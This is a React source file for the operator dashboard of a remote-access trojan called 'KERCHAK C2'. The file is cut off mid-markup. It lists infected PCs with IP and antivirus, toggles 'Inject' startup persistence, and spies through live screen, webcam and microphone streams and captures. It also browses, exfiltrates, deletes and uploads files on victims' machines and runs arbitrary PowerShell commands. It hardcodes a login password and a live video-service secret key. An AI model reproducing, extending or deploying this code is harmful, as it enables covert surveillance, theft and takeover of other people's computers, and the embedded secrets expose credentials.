"use client";

import { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabase';
import { Monitor, Power, RefreshCw, ShieldAlert, Terminal, Camera, Mic, MessageSquare, Shield, Activity, X, Video, ChevronRight, Folder, Settings, Download, Trash2, FileText, Play, Plus, Edit2, Save, Upload, Lock } from 'lucide-react';

interface Computer {
  id: string;
  pc_name: string;
  public_ip: string;
  status: 'online' | 'offline';
  startup_enabled: boolean;
  antivirus: string;
  last_seen: string;
}

export default function Dashboard() {
  // --- 1. ALL STATE HOOKS AT THE TOP ---
  const [computers, setComputers] = useState<Computer[]>([]);
  const [activeModal, setActiveModal] = useState<'chat' | 'screenshot' | 'webcam' | 'stream' | 'explorer' | 'saved_commands' | null>(null);
  const [meteredMeeting, setMeteredMeeting] = useState<any>(null);
  const [selectedPc, setSelectedPc] = useState<string | null>(null);
  const [selectedPcName, setSelectedPcName] = useState<string | null>(null);
  const [screenshots, setScreenshots] = useState<string[]>([]);
  const [chatMessages, setChatMessages] = useState<{ from: string, text: string }[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [activePC, setActivePC] = useState<string | null>(null);
  const [showTerminal, setShowTerminal] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState<string[]>(["Kerchak OS [Version 10.0.22631.3296]", "(c) 2026 Kerchak Corporation. All rights reserved.", ""]);
  const [terminalInput, setTerminalInput] = useState("");
  const [showVoice, setShowVoice] = useState(false);
  const [isAdminMute, setIsAdminMute] = useState(false);
  const [isAdminDeaf, setIsAdminDeaf] = useState(false);
  const [isPcSpeaking, setIsPcSpeaking] = useState(false);
  const [isAdminSpeaking, setIsAdminSpeaking] = useState(false);
  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
  const [isCapturing, setIsCapturing] = useState(false);
  const [countdown, setCountdown] = useState(10);
  
  // File Explorer State
  const [explorerPath, setExplorerPath] = useState("C:\\");
  const [explorerFiles, setExplorerFiles] = useState<{name:string, isDir:boolean, size:number}[]>([]);
  const [isExplorerLoading, setIsExplorerLoading] = useState(false);

  // Saved Commands State
  const [savedCommands, setSavedCommands] = useState<{id:string, name:string, cmd:string, args:string, hasParams:boolean}[]>([]);
  const [isCreatingCommand, setIsCreatingCommand] = useState(false);
  const [newCmd, setNewCmd] = useState({name:'', cmd:'', args:'', hasParams:false});

  // Authentication State
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [isAuthChecking, setIsAuthChecking] = useState(true);
  const MASTER_PASSWORD = "clack45";

  // Audio Context State
  const [isListening, setIsListening] = useState(false);
  const [globalAudioCtx, setGlobalAudioCtx] = useState<AudioContext | null>(null);

  // Refs
  const terminalEndRef = useRef<HTMLDivElement>(null);

  // --- 2. ALL EFFECT HOOKS ---
  
  // Scroll Terminal
  useEffect(() => {
    if (showTerminal) terminalEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [terminalOutput, showTerminal]);

  // Fetch Computers & Realtime
  useEffect(() => {
    const fetchComputers = async () => {
      let { data } = await supabase.from('computers').select('*');
      setComputers(data || []);
    }
    fetchComputers();

    const sub = supabase.channel('public:computers')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'computers' }, (payload) => {
        setComputers((current) => {
          const newPc = payload.new as Computer;
          const index = current.findIndex(c => c.id === newPc.id);
          if (index > -1) {
            const updated = [...current];
            updated[index] = newPc;
            return updated;
          }
          return [...current, newPc];
        });
      }).subscribe();

    return () => { supabase.removeChannel(sub); };
  }, []);

  // Auth check & Countdown
  useEffect(() => {
    const auth = localStorage.getItem('kerchak_auth');
    if (auth === 'true') setIsAuthenticated(true);
    setIsAuthChecking(false);

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev === 0) {
          setComputers(current => [...current]); 
          return 10;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Load Saved Shortcuts
  useEffect(() => {
    const saved = localStorage.getItem('kerchak_shortcuts');
    if (saved) setSavedCommands(JSON.parse(saved));
  }, []);

  // Metered Live Stream Logic
  useEffect(() => {
    if (activeModal !== 'stream' || !selectedPc) return;
    const roomName = 'k' + selectedPc.replace(/-/g, '').substring(0, 12);
    let meeting: any = null;
    let scriptEl: HTMLScriptElement | null = null;
    let active = true;

    const load = () => {
      scriptEl = document.createElement('script');
      scriptEl.src = 'https://cdn.metered.ca/sdk/video/1.4.6/sdk.min.js';
      scriptEl.onload = async () => {
        if (!active) return;
        // @ts-ignore
        meeting = new window.Metered.Meeting();
        setMeteredMeeting(meeting);

        meeting.on('remoteTrackStarted', (item: any) => {
          const container = document.getElementById('stream-container');
          if (!container) return;
          document.getElementById('stream-loading')?.style.setProperty('display', 'none');
          const stream = new MediaStream([item.track]);
          if (item.type === 'video') {
            const v = document.createElement('video') as HTMLVideoElement;
            v.id = item.streamId;
            v.autoplay = true;
            v.playsInline = true;
            v.srcObject = stream;
            v.className = 'rounded-lg border border-white/10 shadow-xl bg-black object-contain w-full md:w-[48%] max-h-[45vh]';
            container.appendChild(v);
          } else {
            const a = document.createElement('audio') as HTMLAudioElement;
            a.id = item.streamId;
            a.autoplay = true;
            a.srcObject = stream;
            container.appendChild(a);
          }
        });

        meeting.on('remoteTrackStopped', (item: any) => {
          document.getElementById(item.streamId)?.remove();
        });

        try {
          console.log(`Attempting to join room: kerchak.metered.live/${roomName}`);
          await meeting.join({ roomURL: `kerchak.metered.live/${roomName}`, name: 'Admin' });
          console.log("Joined successfully");
        } catch(e) { console.error('Metered join failed', e); }
      };
      document.body.appendChild(scriptEl);
    };

    // Laisser 5s au client pour se connecter avant de joindre
    const timer = setTimeout(load, 5000);
    return () => {
      active = false;
      clearTimeout(timer);
      if (meeting) { try { meeting.leaveMeeting(); } catch(e) {} }
      if (scriptEl?.parentNode) scriptEl.parentNode.removeChild(scriptEl);
      setMeteredMeeting(null);
    };
  }, [activeModal, selectedPc]);

  // Audio Polling Logic
  useEffect(() => {
    let interval: any;
    if (isListening) {
      interval = setInterval(async () => {
        if (!selectedPc || !isListening) return;
        const fileName = `${selectedPc}_voice.raw`;
        const { data } = await supabase.storage.from('kerchak-assets').download(fileName + `?t=${new Date().getTime()}`);
        if (data) {
          const arrayBuffer = await data.arrayBuffer();
          let ctx = globalAudioCtx;
          if (!ctx) {
            ctx = new (window.AudioContext || (window as any).webkitAudioContext)({ sampleRate: 16000 });
            setGlobalAudioCtx(ctx);
          }
          if (ctx.state === 'suspended') await ctx.resume();
          const buffer = ctx.createBuffer(1, arrayBuffer.byteLength / 2, 16000);
          const channelData = buffer.getChannelData(0);
          const view = new Int16Array(arrayBuffer);
          for (let i = 0; i < view.length; i++) channelData[i] = view[i] / 32768;
          const source = ctx.createBufferSource();
          source.buffer = buffer;
          source.connect(ctx.destination);
          source.start();
        }
      }, 2000);
    }
    return () => clearInterval(interval);
  }, [isListening, selectedPc, globalAudioCtx]);

  // Incoming Chat Polling
  useEffect(() => {
    let chatInterval: any;
    if (activeModal === 'chat' && selectedPc) {
      chatInterval = setInterval(async () => {
        const { data } = await supabase.from('chat_messages')
          .select('*')
          .eq('computer_id', selectedPc)
          .eq('sender', 'pc')
          .eq('is_read', false);

        if (data && data.length > 0) {
          for (const msg of data) {
            await supabase.from('chat_messages').update({ is_read: true }).eq('id', msg.id);
            setChatMessages(prev => [...prev, { from: 'pc', text: msg.message }]);
          }
        }
      }, 2000);
    }
    return () => clearInterval(chatInterval);
  }, [activeModal, selectedPc]);

  // --- 3. HELPER FUNCTIONS ---

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (passwordInput === MASTER_PASSWORD) {
      setIsAuthenticated(true);
      localStorage.setItem('kerchak_auth', 'true');
    } else {
      alert("Accès refusé. Mot de passe incorrect.");
      setPasswordInput("");
    }
  };

  const getAvIcon = (av: string) => {
    const lowAv = av?.toLowerCase() || "";
    if (lowAv.includes('bitdefender')) return "https://www.google.com/s2/favicons?domain=bitdefender.com&sz=128";
    if (lowAv.includes('avast')) return "https://www.google.com/s2/favicons?domain=avast.com&sz=128";
    if (lowAv.includes('kaspersky')) return "https://www.google.com/s2/favicons?domain=kaspersky.com&sz=128";
    if (lowAv.includes('defender')) return "https://upload.wikimedia.org/wikipedia/commons/8/85/Microsoft_Defender_2020_Fluent_Design_icon.png";
    if (lowAv.includes('avg')) return "https://www.google.com/s2/favicons?domain=avg.com&sz=128";
    if (lowAv.includes('norton')) return "https://www.google.com/s2/favicons?domain=norton.com&sz=128";
    if (lowAv.includes('eset')) return "https://www.google.com/s2/favicons?domain=eset.com&sz=128";
    if (lowAv.includes('mcafee')) return "https://www.google.com/s2/favicons?domain=mcafee.com&sz=128";
    return "https://cdn-icons-png.flaticon.com/512/752/752712.png";
  };

  const deleteComputer = async (id: string, name: string) => {
    if (window.confirm(`Êtes-vous sûr de vouloir supprimer ${name} de la liste ?`)) {
      await supabase.from('computers').delete().eq('id', id);
      setComputers(current => current.filter(c => c.id !== id));
    }
  };

  const isOnline = (lastSeen: string) => {
    if (!lastSeen) return false;
    const utcString = lastSeen.endsWith('Z') ? lastSeen : `${lastSeen}Z`;
    const last = new Date(utcString).getTime();
    const now = new Date().getTime();
    return (now - last) < 15000;
  };

  const fetchScreenshots = async (pcName: string, prefix: string) => {
    const safeName = pcName.replace(/[\/\\ :|]/g, '_');
    const { data } = await supabase.storage.from('kerchak-assets').list('', {
      limit: 20,
      sortBy: { column: 'created_at', order: 'desc' },
    });
    if (data) {
      const pcFiles = data.filter(f => f.name.startsWith(prefix + safeName));
      const urls = pcFiles.map(f => supabase.storage.from('kerchak-assets').getPublicUrl(f.name).data.publicUrl);
      setScreenshots(urls);
      setIsCapturing(false);
    }
  };

  const requestCapture = async (type: 'ss' | 'webcam') => {
    if (!selectedPc || !selectedPcName) return;
    setIsCapturing(true);
    setScreenshots([]);
    await supabase.from('commands').insert({ computer_id: selectedPc, command: type, args: "", status: 'pending' });
    setTimeout(() => fetchScreenshots(selectedPcName, type === 'ss' ? 'scr_' : 'webcam_'), 5000);
  };

  const sendCommand = async (pcId: string, pcName: string, cmd: string, args: string = "") => {
    setSelectedPc(pcId);
    setSelectedPcName(pcName);
    await supabase.from('commands').insert({ computer_id: pcId, command: cmd, args: args, status: 'pending' });
    if (cmd === 'chat_open') setActiveModal('chat');
  };

  const saveCommand = () => {
    if (!newCmd.name || !newCmd.cmd) return;
    const cmd = { ...newCmd, id: Math.random().toString(36).substr(2, 9) };
    const updated = [...savedCommands, cmd];
    setSavedCommands(updated);
    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
    setNewCmd({name:'', cmd:'', args:'', hasParams:false});
    setIsCreatingCommand(false);
  };

  const deleteSavedCommand = (id: string) => {
    const updated = savedCommands.filter(c => c.id !== id);
    setSavedCommands(updated);
    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
  };

  const runSavedCommand = async (sc: any) => {
    if (!selectedPc || !selectedPcName) return;
    let finalArgs = sc.args;
    if (sc.hasParams) {
      const p = window.prompt("Enter parameters for: " + sc.name);
      if (p === null) return;
      finalArgs = finalArgs.replace(/%p%/g, p);
    }
    await sendCommand(selectedPc, selectedPcName, sc.cmd, finalArgs);
    alert(`Shortcut "${sc.name}" triggered.`);
  };

  const openExplorer = async (pcId: string, pcName: string) => {
    setSelectedPc(pcId);
    setSelectedPcName(pcName);
    setActiveModal('explorer');
    fetchFiles("C:\\");
  };

  const fetchFiles = async (path: string) => {
    if (!selectedPc) return;
    setIsExplorerLoading(true);
    setExplorerPath(path);
    const { data } = await supabase.from('commands').insert({ computer_id: selectedPc, command: 'ls', args: path, status: 'pending' }).select().single();
    if (data) {
      const check = setInterval(async () => {
        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
        if (res?.status === 'executed' && res.result) {
          try { 
            const raw = JSON.parse(res.result);
            const mapped = raw.map((f: any) => ({
              name: f.n,
              isDir: f.d === 1,
              size: f.s
            }));
            setExplorerFiles(mapped); 
          } catch(e) {
            console.error("Failed to parse directory listing", e);
          }
          setIsExplorerLoading(false);
          clearInterval(check);
        }
      }, 1000);
      setTimeout(() => { clearInterval(check); setIsExplorerLoading(false); }, 15000);
    }
  };

  const downloadFile = async (name: string) => {
    if (!selectedPc) return;
    const fullPath = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + name;
    await supabase.from('commands').insert({ computer_id: selectedPc, command: 'dl', args: fullPath, status: 'pending' });
    alert("Download requested. Wait for storage upload...");
  };

  const deleteFile = async (name: string) => {
    if (!selectedPc || !window.confirm(`Delete ${name}?`)) return;
    const fullPath = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + name;
    await supabase.from('commands').insert({ computer_id: selectedPc, command: 'rm', args: fullPath, status: 'pending' });
    setTimeout(() => fetchFiles(explorerPath), 2000);
  };

  const startLiveStream = async (pcId: string, pcName: string) => {
    setSelectedPc(pcId);
    setSelectedPcName(pcName);
    const roomName = 'k' + pcId.replace(/-/g, '').substring(0, 12);
    try {
      const roomName = 'k' + pcId.replace(/-/g, '').substring(0, 12);
      const secretKey = 'aoGqhdUx0-0GdtuP5zhL6hSDiW8SLRwv80ME3HF_cesDvDrx';
      
      await fetch(`https://kerchak.metered.live/api/v1/room?secretKey=${secretKey}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          roomName, 
          privacy: 'public'
        })
      });
    } catch(e) {
      console.log("Room might already exist or creation failed", e);
    }
    await supabase.from('commands').insert({ computer_id: pcId, command: 'stream_start', args: roomName, status: 'pending' });
    setActiveModal('stream');
  };

  const sendChatMessage = async () => {
    if (!chatInput.trim() || !selectedPc) return;
    setChatMessages([...chatMessages, { from: 'me', text: chatInput }]);
    await supabase.from('chat_messages').insert({ computer_id: selectedPc, sender: 'admin', message: chatInput, is_read: false });
    setChatInput("");
  };

  // --- 4. CONDITIONAL RETURNS FOR AUTH/LOADING ---

  if (isAuthChecking) {
    return <div className="min-h-screen bg-black flex items-center justify-center"><RefreshCw className="text-red-600 animate-spin" size={40} /></div>;
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-6 relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,38,38,0.1),transparent)] animate-pulse"></div>
        <div className="w-full max-w-md bg-[#0c0c0c] border border-red-500/20 p-8 rounded-3xl shadow-[0_0_100px_rgba(220,38,38,0.15)] relative z-10">
          <div className="flex flex-col items-center gap-6 mb-8">
            <div className="w-20 h-20 bg-red-600/10 rounded-2xl border border-red-500/30 flex items-center justify-center shadow-[0_0_30px_rgba(220,38,38,0.2)]">
              <Lock className="text-red-500" size={40} />
            </div>
            <div className="text-center">
              <h1 className="text-3xl font-black text-white tracking-tighter uppercase mb-2">Kerchak <span className="text-red-600">Access</span></h1>
              <p className="text-gray-500 text-xs font-bold uppercase tracking-widest opacity-50">Authorized Personnel Only</p>
            </div>
          </div>
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="relative group">
              <input type="password" value={passwordInput} onChange={e => setPasswordInput(e.target.value)} autoFocus placeholder="ENTER ACCESS KEY..." className="w-full bg-white/5 border border-white/10 rounded-xl px-6 py-4 text-center text-white font-mono tracking-[0.5em] focus:outline-none focus:border-red-600 transition-all placeholder:tracking-normal placeholder:opacity-30" />
            </div>
            <button type="submit" className="w-full bg-red-600 hover:bg-red-500 text-white font-black py-4 rounded-xl shadow-[0_0_20px_rgba(220,38,38,0.3)] transition-all active:scale-95 uppercase tracking-widest text-sm">Unlock Terminal</button>
          </form>
          <div className="mt-8 text-center"><span className="text-[10px] text-gray-600 font-bold uppercase tracking-widest">© 2026 Kerchak Secure Systems</span></div>
        </div>
      </div>
    );
  }

  // --- 5. MAIN DASHBOARD UI ---
  return (
    <div className="min-h-screen bg-[#050505] text-gray-200 p-6 font-sans selection:bg-red-500/30">
      <style dangerouslySetInnerHTML={{
        __html: `
        @keyframes gradientFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .animate-gradient-red { background: linear-gradient(-45deg, #ef4444, #991b1b, #dc2626, #7f1d1d); background-size: 400% 400%; animation: gradientFlow 3s ease infinite; -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .animate-gradient-green { background: linear-gradient(-45deg, #22c55e, #14532d, #16a34a, #064e3b); background-size: 400% 400%; animation: gradientFlow 3s ease infinite; -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .animate-gradient-title { background: linear-gradient(-45deg, #ffffff, #9ca3af, #f3f4f6, #4b5563); background-size: 400% 400%; animation: gradientFlow 5s ease infinite; -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
      `}} />
      <header className="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
        <div className="flex items-center gap-4">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-red-600 to-red-900 flex items-center justify-center shadow-[0_0_20px_rgba(220,38,38,0.4)]">
            <Activity className="text-white" size={24} />
          </div>
          <div>
            <h1 className="text-2xl font-bold tracking-wider text-white">KERCHAK <span className="text-red-500">C2</span></h1>
            <p className="text-xs text-gray-500 uppercase tracking-widest">Advanced Command & Control</p>
          </div>
        </div>
        <div className="flex items-center gap-4 bg-[#111] border border-white/10 px-4 py-2 rounded-full shadow-lg">
          <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
          <span className="text-sm font-medium">{computers.filter(c => isOnline(c.last_seen)).length} Online</span>
          <div className="w-[1px] h-4 bg-white/10 mx-2"></div>
          <button onClick={() => { localStorage.removeItem('kerchak_auth'); setIsAuthenticated(false); }} className="text-[10px] font-bold uppercase tracking-widest text-red-500 hover:text-red-400 transition-colors flex items-center gap-2"><Power size={14} /> Logout</button>
        </div>
      </header>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {computers.map(pc => (
          <div key={pc.id} className="relative group bg-[#0a0a0c] border border-white/10 rounded-2xl overflow-hidden hover:border-red-500/50 transition-all duration-300 shadow-xl">
            <div className={`absolute top-0 left-0 w-full h-1 ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_15px_#22c55e]' : 'bg-gray-600'}`}></div>
            <div className="p-5">
              <div className="flex justify-between items-start mb-4">
                <div>
                  <h3 className="text-xl font-bold text-white group-hover:text-red-400 transition-colors flex items-center gap-2"><Monitor size={18} /> <span className="animate-gradient-title">{pc.pc_name}</span></h3>
                  <p className="text-xs text-gray-400 mt-1">{pc.public_ip}</p>
                </div>
                <div className="flex items-center gap-3">
                  <div className={`w-3 h-3 rounded-full ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_15px_#22c55e] animate-pulse' : 'bg-gray-600'}`}></div>
                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={20} /></button>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4 mb-6">
                <div className="bg-white/5 p-4 rounded-xl border border-white/10 flex items-center gap-3">
                  <img src={getAvIcon(pc.antivirus)} alt="AV" className="w-8 h-8 object-contain" />
                  <div>
                    <span className="text-gray-500 text-[10px] uppercase font-bold tracking-widest block">Antivirus</span>
                    <span className="text-red-400 font-bold text-sm animate-gradient-red">{pc.antivirus || 'None'}</span>
                  </div>
                </div>
                <div className="bg-white/5 p-4 rounded-xl border border-white/10">
                  <span className="text-gray-500 text-[10px] uppercase font-bold tracking-widest block mb-1 flex items-center gap-1"><Shield size={12} /> Persistence</span>
                  <div className="flex items-center justify-between">
                    <span className={pc.startup_enabled ? 'animate-gradient-green font-bold text-sm' : 'text-gray-400 text-sm'}>{pc.startup_enabled ? 'ACTIVE' : 'NONE'}</span>
                    {pc.startup_enabled ? (
                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup_remove')} className="text-[10px] bg-red-500/20 text-red-400 px-1 rounded hover:bg-red-500/40">Remove</button>
                    ) : (
                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup')} className="text-[10px] bg-green-500/20 text-green-400 px-1 rounded hover:bg-green-500/40">Inject</button>
                    )}
                  </div>
                </div>
              </div>
              <div className="grid grid-cols-4 gap-2">
                <button onClick={() => startLiveStream(pc.id, pc.pc_name)} className="col-span-3 p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center items-center gap-2 text-green-400 transition-colors font-bold" title="Live Stream (Screen, Webcam, Mic)"><Video size={18} /> Live Stream</button>
                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18} /></button>
                <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18} /></button>
                <button onClick={() => openExplorer(pc.id, pc.pc_name)} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="File Explorer"><Folder size={18} /></button>
                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('saved_commands'); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Saved Commands / Shortcuts"><Settings size={18} /></button>
                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18} /></button>
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* File Explorer Modal */}
      {activeModal === 'explorer' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
          <div className="bg-[#0c0c0c] border border-white/10 rounded-2xl overflow-hidden w-full max-w-5xl shadow-2xl flex flex-col h-[700px]">
            <div className="flex justify-between items-center p-5 border-b border-white/5 bg-white/5">
              <div className="flex items-center gap-3"><Folder className="text-blue-500" size={24} /><h3 className="font-bold text-white text-lg">Explorer - {selectedPcName}</h3></div>
              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white transition-colors"><X size={24} /></button>
            </div>
            <div className="bg-[#1a1a1c] p-3 flex gap-2 items-center px-5 border-b border-white/5">
              <button onClick={() => { const parts = explorerPath.split('\\').filter(Boolean); if (parts.length > 1) { parts.pop(); const newPath = parts.join('\\') + (parts.length === 1 && parts[0].endsWith(':') ? '\\' : ''); fetchFiles(newPath); } }} className="p-2 hover:bg-white/5 rounded text-gray-400"><ChevronRight size={18} className="rotate-180" /></button>
              <input type="text" value={explorerPath} onChange={e => setExplorerPath(e.target.value)} onKeyDown={e => e.key === 'Enter' && fetchFiles(explorerPath)} className="flex-1 bg-black/40 border border-white/10 rounded-lg px-4 py-1.5 text-sm text-gray-300 focus:outline-none focus:border-blue-500" />
              <button onClick={() => { const url = window.prompt("Enter direct URL of file to upload to PC:"); const name = window.prompt("Enter filename to save as:", url?.split('/').pop()); if (url && name && selectedPc) { const local = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + name; sendCommand(selectedPc, selectedPcName!, 'ul', `${url}|${local}`); alert("Upload command sent."); } }} className="p-2 hover:bg-white/5 rounded text-green-400 flex items-center gap-2 text-xs font-bold"><Upload size={18} /> UPLOAD</button>
              <button onClick={() => fetchFiles(explorerPath)} className="p-2 hover:bg-white/5 rounded text-blue-400"><RefreshCw size={18} className={isExplorerLoading ? 'animate-spin' : ''} /></button>
            </div>
            <div className="flex-1 overflow-y-auto p-4 custom-scrollbar">
              {explorerFiles.length >= 500 && (
                <div className="mb-4 p-2 bg-yellow-500/10 border border-yellow-500/30 rounded text-yellow-500 text-[10px] uppercase font-bold text-center animate-pulse">
                  ⚠️ Directory too large - showing first 500 items for performance
                </div>
              )}
              {isExplorerLoading ? (<div className="flex flex-col items-center justify-center h-full gap-4 text-gray-500"><RefreshCw size={40} className="animate-spin opacity-20" /><span className="animate-pulse">Loading directory content...</span></div>) : (
                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
                  {explorerFiles.map((file, i) => (
                    <div key={i} className="group relative bg-white/5 hover:bg-white/10 border border-white/5 rounded-xl p-4 transition-all cursor-pointer flex flex-col items-center text-center gap-2" onDoubleClick={() => file.isDir ? fetchFiles(explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + file.name) : null}>
                      {file.isDir ? <Folder className="text-yellow-500 fill-yellow-500/20" size={48} /> : <FileText className="text-blue-400" size={48} />}
                      <span className="text-xs text-gray-300 truncate w-full font-medium">{file.name}</span>
                      {!file.isDir && <span className="text-[10px] text-gray-500">{(file.size / 1024 / 1024).toFixed(2)} MB</span>}
                      <div className="absolute top-1 right-1 opacity-0 group-hover:opacity-100 flex gap-1 transition-opacity">
                        {!file.isDir && <button onClick={(e) => { e.stopPropagation(); downloadFile(file.name); }} className="p-1 bg-green-500/20 text-green-400 rounded hover:bg-green-500/40" title="Download"><Download size={14} /></button>}
                        <button onClick={(e) => { e.stopPropagation(); deleteFile(file.name); }} className="p-1 bg-red-500/20 text-red-400 rounded hover:bg-red-500/40" title="Delete"><Trash2 size={14} /></button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Saved Commands Modal */}
      {activeModal === 'saved_commands' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
          <div className="bg-[#0c0c0c] border border-white/10 rounded-2xl overflow-hidden w-full max-w-4xl shadow-2xl flex flex-col h-[600px]">
            <div className="flex justify-between items-center p-5 border-b border-white/5 bg-white/5">
              <div className="flex items-center gap-3"><Settings className="text-yellow-500" size={24} /><h3 className="font-bold text-white text-lg">Command Shortcuts</h3></div>
              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white transition-colors"><X size={24} /></button>
            </div>
            <div className="p-6 overflow-y-auto flex-1 custom-scrollbar">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {savedCommands.map(sc => (
                  <div key={sc.id} className="bg-white/5 border border-white/5 rounded-xl p-4 flex flex-col gap-3 group hover:border-yellow-500/30 transition-all">
                    <div className="flex justify-between items-start">
                      <div><h4 className="font-bold text-white group-hover:text-yellow-400 transition-colors">{sc.name}</h4><code className="text-[10px] text-gray-500 block mt-1 truncate">{sc.cmd}</code></div>
                      <div className="flex gap-2">
                        <button onClick={() => runSavedCommand(sc)} className="p-2 bg-green-500/20 text-green-400 rounded-lg hover:bg-green-500/40"><Play size={16} /></button>
                        <button onClick={() => deleteSavedCommand(sc.id)} className="p-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/40"><Trash2 size={16} /></button>
                      </div>
                    </div>
                  </div>
                ))}
                <button onClick={() => setIsCreatingCommand(true)} className="border-2 border-dashed border-white/10 rounded-xl p-8 flex flex-col items-center justify-center gap-3 text-gray-500 hover:text-yellow-400 hover:border-yellow-500/40 transition-all"><Plus size={32} /><span className="font-bold uppercase tracking-widest text-xs">New Shortcut</span></button>
              </div>
            </div>
            {isCreatingCommand && (
              <div className="absolute inset-0 bg-black/95 flex flex-col p-8 gap-6 animate-in fade-in zoom-in duration-200">
                <div className="flex justify-between items-center"><h3 className="text-2xl font-bold text-white">Create Shortcut</h3><button onClick={() => setIsCreatingCommand(false)} className="text-gray-400 hover:text-white"><X size={24} /></button></div>
                <div className="grid grid-cols-1 gap-6">
                  <div className="space-y-2"><label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Name</label><input type="text" value={newCmd.name} onChange={e=>setNewCmd({...newCmd, name:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500" placeholder="Change Wallpaper" /></div>
                  <div className="space-y-2"><label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Command Type</label><select value={newCmd.cmd} onChange={e=>setNewCmd({...newCmd, cmd:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500"><option value="cmd">CMD Execution</option><option value="chat_open">Open Chat</option><option value="stream_start">Start Stream</option><option value="ss">Screenshot</option></select></div>
                  <div className="space-y-2"><label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Args / Shell Command</label><textarea value={newCmd.args} onChange={e=>setNewCmd({...newCmd, args:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500 h-32 font-mono text-sm" placeholder="powershell -Command ..."></textarea></div>
                  <div className="flex items-center gap-3"><input type="checkbox" checked={newCmd.hasParams} onChange={e=>setNewCmd({...newCmd, hasParams:e.target.checked})} className="w-5 h-5 accent-yellow-500" /><label className="text-sm text-gray-300">Ask for parameters before executing</label></div>
                  <button onClick={saveCommand} className="mt-4 bg-yellow-500 hover:bg-yellow-400 text-black font-bold py-4 rounded-xl shadow-xl transition-all flex items-center justify-center gap-2"><Save size={20} /> Save Shortcut</button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {(activeModal === 'screenshot' || activeModal === 'webcam') && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-5xl shadow-2xl">
            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
              <h3 className="font-bold flex items-center gap-2 text-white">{activeModal === 'screenshot' ? <><Monitor className="text-blue-400" size={18} /> Monitor Captures - {selectedPcName}</> : <><Camera className="text-purple-400" size={18} /> Webcam Captures - {selectedPcName}</>}</h3>
              <div className="flex gap-4 items-center">
